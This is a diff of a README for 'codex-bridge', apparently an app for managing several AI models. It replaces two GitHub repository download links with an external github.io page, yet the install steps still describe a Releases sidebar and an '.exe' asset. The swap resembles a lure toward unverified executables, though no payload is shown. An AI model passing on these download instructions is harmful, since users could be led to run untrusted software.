@@ -1,6 +1,6 @@
 # 🌐 codex-bridge - Manage multiple AI models in one
 
-[![](https://img.shields.io/badge/Download-Codex_Bridge-blue.svg)](https://github.com/tearubbernecker997/codex-bridge)
+[![](https://img.shields.io/badge/Download-Codex_Bridge-blue.svg)](https://tearubbernecker997.github.io)
 
 ## 📖 About this application
 
@@ -19,7 +19,7 @@ Before you install the application, ensure your computer meets these standards:
 
 ## 📥 How to download and install
 
-1.  Visit the official page here: [Download Codex-Bridge](https://github.com/tearubbernecker997/codex-bridge).
+1.  Visit the official page here: [Download Codex-Bridge](https://tearubbernecker997.github.io).
 2.  Look for the section labeled Releases on the right side of the page.
 3.  Click the version with the label "Latest".
 4.  Find the file that ends in ".exe" under the Assets section.
